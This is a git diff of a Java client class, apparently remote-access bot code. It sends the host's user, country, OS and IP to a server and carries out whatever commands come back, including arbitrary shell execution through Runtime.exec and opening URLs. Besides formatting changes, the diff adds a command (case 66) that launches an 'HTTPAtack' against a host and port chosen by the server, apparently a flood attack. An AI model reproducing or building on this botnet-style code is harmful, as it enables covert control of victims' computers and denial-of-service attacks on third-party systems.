@@ -4,7 +4,6 @@ import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.URI;
-import java.net.URISyntaxException;
 
 /**
  * Created by Douglas Giovanella on 31/07/2017.
@@ -40,7 +39,7 @@ public class Client {
         String ipUser = ipAddress.getHostAddress();
 
 
-        bfw.write("[" + osCountry + "]" + osUser + " - " + osName + " - [" + ipUser +"]\r\n+");
+        bfw.write("[" + osCountry + "]" + osUser + " - " + osName + " - [" + ipUser + "]\r\n+");
         //enviarMensagem("Computer IP: " + ipAddress.getHostAddress() + " Connected");
         bfw.flush();
     }
@@ -73,34 +72,30 @@ public class Client {
                 String[] msgFormatted = msg.split("&");
 
                 switch (Integer.parseInt(msgFormatted[0])) {
-                    case 0 :
+                    case 0:
                         Runtime.getRuntime().exec(msgFormatted[1]);
                         sendMessage("Computador programado para desligar!");
                         break;
-                    case 1 :
+                    case 1:
                         try {
                             java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));
                             sendMessage("Site " + msgFormatted[1] + " aberto!");
-                        }catch (Exception e) {
+                        } catch (Exception e) {
                             e.printStackTrace();
                             sendMessage(e.getMessage());
                         }
                         break;
-                    case 2 :
+                    case 2:
                         Runtime.getRuntime().exec(msgFormatted[1]);
                         break;
-                    case 3 :
+                    case 66:
+                        new HTTPAtack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();
                         break;
                     default:
                         sendMessage("Erro ao enviar o comando.");
                         break;
 
                 }
-
-                //System.out.println("Message Received: "+ msg);
-
-                //Runtime.getRuntime().exec("shutdown -s -t 60000");
-
             }
     }
 
